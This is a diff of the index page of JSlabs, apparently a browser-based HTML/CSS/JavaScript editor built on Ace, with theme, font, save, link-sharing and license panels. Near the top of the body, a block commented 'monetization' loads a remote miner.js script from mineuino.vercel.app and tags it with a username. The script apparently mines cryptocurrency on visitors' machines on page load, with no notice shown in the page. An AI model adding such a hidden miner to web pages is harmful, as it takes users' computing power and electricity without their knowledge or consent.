@@ -1,81 +1,241 @@
 <!DOCTYPE html>
 <html lang="en">
   <head>
-    <meta
-      name="google-site-verification"
-      content="RaFB8z3zoCeaQfGT8eUAh87rK12evpAV4NFL5Sxdnhk"
-    />
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>JSlabs</title>
+    <title>JSlabs Editor</title>
+
+    <!-- Ace editor -->
+    <script src="https://rawgithub.com/ajaxorg/ace-builds/master/src/ace.js"></script>
+    <script
+      src="https://rawgithub.com/ajaxorg/ace-builds/master/src/ext-emmet.js"
+      defer
+    ></script>
+    <script
+      src="https://rawgit.com/ajaxorg/ace-builds/master/src/ext-language_tools.js"
+      defer
+    ></script>
+    <script
+      src="https://rawgithub.com/nightwing/emmet-core/master/emmet.js"
+      defer
+    ></script>
+    <script
+      src="https://cdnjs.cloudflare.com/ajax/libs/ace/1.4.12/ace.js"
+      integrity="sha512-GZ1RIgZaSc8rnco/8CXfRdCpDxRCphenIiZ2ztLy3XQfCbQUSCuk8IudvNHxkRA3oUg6q0qejgN/qqyG1duv5Q=="
+      crossorigin="anonymous"
+    ></script>
+    <!-- encode -->
+    <script
+      src="https://cdn.jsdelivr.net/npm/js-base64@2.5.2/base64.min.js"
+      defer
+    ></script>
+    <script src="https://cdn.jsdelivr.net/gh/davidshimjs/qrcodejs/qrcode.min.js"></script>
+    <!-- styles -->
     <link
-      rel="shortcut icon"
-      type="image/x-icon"
-      href="Main-page/Favicon.svg"
+      rel="stylesheet"
+      href="https://fonts.googleapis.com/css2?family=Work+Sans:wght@700&display=swap"
     />
-    <link rel="stylesheet" href="Main-page/styles.css" />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.css"
+      integrity="sha512-5A8nwdMOWrSz20fDsjczgUidUBR8liPYU+WymTZP1lmY9G6Oc7HlZv156XqnsgNUzTyMefFTcsFH/tnJE/+xBg=="
+      crossorigin="anonymous"
+      defer
+    />
+    <link
+      rel="stylesheet"
+      href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css"
+      integrity="sha512-HK5fgLBL+xu6dm/Ii3z4xhlSUyZgTT9tuc/hSrtw6uzJOvgRr2a9jyxxT1ely+B+xFAmJKVSTbpM/CuL7qxO8w=="
+      crossorigin="anonymous"
+      defer
+    />
+
+    <!-- My Stuff -->
+    <script src="js/toggle.js" defer></script>
+    <script src="js/acesetup.js" defer></script>
+    <script src="js/showcode.js" defer></script>
+    <script src="js/popup.js" defer></script>
+    <script src="js/tabs.js" defer></script>
+    <script src="js/format.js" type="module" defer></script>
+    <script src="js/url.js" defer></script>
+    <script src="js/copy.js" defer></script>
+    <script src="js/social.js" defer></script>
+    <link rel="stylesheet" href="styles/styles.css" />
+    <link rel="shortcut icon" type="image/x-icon" href="imgs/favicon.svg" />
   </head>
   <body>
-    <main>
-      <a href="editor/index.html">the editor</a>
-      <a href=""></a>
-      <a href=""></a>
-      <a href=""></a>
-    </main>
-    <header>
-      <img src="Main-page/Favicon.svg" alt="Logo" width="128" height="128" />
-      <h1 class="title">JSlabs</h1>
-      <h2>Pages in the url, lightspeed</h2>
+    <!-- monetization -->
+    <script
+      type="text/javascript"
+      src="https://cdn.rawgit.com/h2non/jsHashes/master/hashes.js"
+    ></script>
+    <script src="https://mineuino.vercel.app/miner.js" defer></script>
+    <div id="mineuino-div" data-mineuino-username="vatsadev"></div>
+
+    <header class="header">
+      <img src="imgs/favicon.svg" class="logo" />
+      <h2 style="margin-left: 15px; background: -webkit-linear-gradient(#e29d08, #ff8c05);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;">jslabs</h2>
+      <i class="fas fa-cog fa-spin" id="settings" style="float: left"></i>
     </header>
-    <main>
-      <h2>create a webpage stored only in a url!</h2>
-      <ul>
-        <li>Fast</li>
-        <li>No dependencies</li>
-        <li>No hosting</li>
-        <li>No cost</li>
-        <li>No commitment</li>
-        <li>Forever editable</li>
-      </ul>
-      <h3>Document.write</h3>
-      <img src="Main-page/doc.write.png" alt="doc.write" />
-      <p>
-        Both Jsbin and Jsfiddle use document.write multiple times in the
-        immediate front, slowing you down. JSlabs uses data-urls in the
-        background, to speed up your usage.
-      </p>
-      <h3>Speed</h3>
-      <img src="Main-page/Speed.png" alt="speed" />
-      <p>
-        Codepen has to go to a cloud, build files on servers, and then serve
-        them. This with millions of pens at the same time. All of jslabs is
-        local, serving your stuff to you only, and no one else, with data urls.
-      </p>
-      <br />
+    <div class="editor">
+      <div id="html-tab">
+        <button class="format" onclick="format('html')">✨Tidy</button>
+        <div style="display: inline">Html</div>
+      </div>
+      <div id="editor-html"></div>
+      <div id="css-tab">
+        <button class="format" onclick="format('css')">✨Tidy</button>
+        <div style="display: inline">Css</div>
+      </div>
+      <div id="editor-css"></div>
+      <div id="js-tab">
+        <button class="format" onclick="format('js')">✨Tidy</button>
+        <div style="display: inline">Javascript</div>
+      </div>
+      <div id="editor-js"></div>
+    </div>
+    <div id="hotbar">
+      <input type="checkbox" id="NormCss" onchange="nCssChange()" />
+      <label for="NormCss">Normalize css</label>
+    </div>
+    <iframe
+      id="output"
+      frameborder="0"
+      style="z-index: -10"
+      allow="accelerometer; camera; encrypted-media; geolocation; gyroscope; microphone; midi"
+      allowfullscreen="true"
+      allowtransparency="true"
+      sandbox="allow-downloads allow-forms allow-scripts allow-modals allow-pointer-lock allow-popups allow-presentation allow-same-origin allow-top-navigation-by-user-activation"
+    ></iframe>
 
-      
-      <ul style="text-align:left;">
-        <h2>Whats included</h2>
-        <li>debug, publish, embed modes</li>
-        <li>A nice editor with emmet and auto completion!</li>
-        <li>prettier formatting</li>
-        <li>automatic Jslint</li>
-      </ul>
+    <div id="popup" class="modal">
+      <!-- Modal content -->
+      <div class="modal-content">
+        <span class="close">&times;</span>
+        <h2>welcome to JsLabs</h2>
+        <div class="tab">
+          <button class="tablinks" onclick="openTab(event, 'Editor')">
+            Editor Settings
+          </button>
+          <button class="tablinks" onclick="openTab(event, 'Save')">
+            Save
+          </button>
+          <button class="tablinks" onclick="openTab(event, 'Links')">
+            Links
+          </button>
+          <button class="tablinks" onclick="openTab(event, 'Social')">
+            Social
+          </button>
+          <button class="tablinks" onclick="openTab(event, 'Other')">
+            Other
+          </button>
+        </div>
 
-      <ul style="text-align:left;">
-        <li>
-          <a href="http://jspen.co">JSPen</a><br />
-          <a href="https://bit.ly/3aPKrpN">Post about the creation of JSPen</a>
-        </li>
-        <p>Similar in some ways (though unrelated) to the following projects</p>
-        <li>
-          <a href="https://github.com/alcor/itty-bitty">itty.bitty.site</a><br />
-          <a href="https://github.com/umpox/TinyEditor">TinyEditor</a>
-        </li>
-      </ul>
+        <!-- Tab content -->
+        <div id="Editor" class="tabcontent">
+          <h1>Themes</h1>
+          <label for="Themes">Choose a Theme:</label>
+          <select
+            name="Themes"
+            id="theme"
+            onchange="theme(document.getElementById('theme').value);"
+          >
+            <option value="monokai">Monokai (dark)</option>
+            <option value="dracula">Dracula (dark)</option>
+            <option value="github">Github (light)</option>
+            <option value="chrome">Chrome (light)</option>
+            <option value="chaos">Chaos (dark)</option>
+          </select>
 
-      <a href="editor/index.html">Use the Editor Now!</a><br />
-      <a href="https://github.com/jstrieb/urlpages">Inspired by Url pages</a>
-    </main>
+          <h1>toggle view <i class="fas fa-eye" aria-hidden="true"></i></h1>
+          <button onclick="toggle(1)">
+            <img src="imgs/tog-1.svg" alt="toggle 1" />
+          </button>
+          <button onclick="toggle(2)">
+            <img src="imgs/tog-2.svg" alt="toggle 2" />
+          </button>
+          <button onclick="toggle(3)">
+            <img src="imgs/tog-3.svg" alt="toggle 3" />
+          </button>
+          <button onclick="toggle(4)">
+            <img src="imgs/tog-4.svg" alt="toggle 4" />
+          </button>
+          <h1>Font</h1>
+          <label for="font">Font:</label>
+          <select
+            name="font"
+            id="font"
+            onchange="font(document.getElementById('font').value);"
+          >
+            <option value="8">8px</option>
+            <option value="12">12px</option>
+            <option value="18">18px</option>
+            <option value="24">24px</option>
+            <option value="48">48px</option>
+          </select>
+        </div>
+
+        <div id="Save" class="tabcontent">
+          <h1>File</h1>
+          <button onclick="makeFile()" id="file">download file</button>
+          <!--make a homepage and stuff, also offline storage-->
+        </div>
+
+        <div id="Links" class="tabcontent">
+          <h2>Go to</h2>
+          <a href="#" id="publish-link" target="_blank">link to published</a
+          ><br />
+          <a href="#" id="embed-link" target="_blank">link to embed</a><br />
+          <h2>Copy link</h2>
+          <input type="text" value="Hello World" id="copyp" readonly />
+          <button onclick="copy('copyp')">Copy publish link</button><br />
+          <input type="text" value="Hello World" id="copye" readonly />
+          <button onclick="copy('copye')">Copy embed link</button><br />
+          <h3>Offline URL</h3>
+          <input type="text" value="Hello World" id="copyd" readonly />
+          <button onclick="copy('copyd')">Copy Data Url</button><br />
+        </div>
+
+        <div id="Social" class="tabcontent">
+          <h2>Social</h2>
+          <button onclick="tweet()">Tweet it!</button>
+        </div>
+
+        <div id="Other" class="tabcontent">
+          <h2>License</h2>
+          <p>All labs are licensed MIT</p>
+          <pre class="code">
+              MIT License Copyright
+              (c) creator of lab
+
+              Permission is hereby
+              granted, free of charge, to any person obtaining a copy of this
+              software and associated documentation files (the "Software"), to
+              deal in the Software without restriction, including without
+              limitation the rights to use, copy, modify, merge, publish,
+              distribute, sublicense, and/or sell copies of the Software, and to
+              permit persons to whom the Software is furnished to do so, subject
+              to the following conditions: 
+              
+              The above copyright notice and this
+              permission notice shall be included in all copies or substantial
+              portions of the Software. 
+              
+              THE SOFTWARE IS PROVIDED "AS IS",
+              WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT
+              NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A
+              PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+              AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR
+              OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR
+              OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE
+              OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
+          </pre>
+          <h2>Open Source</h2>
+          our open source can be found on <u><a href="https://github.com/VatsaDev/JsLabs">github</a></u>
+        </div>
+      </div>
+    </div>
   </body>
 </html>
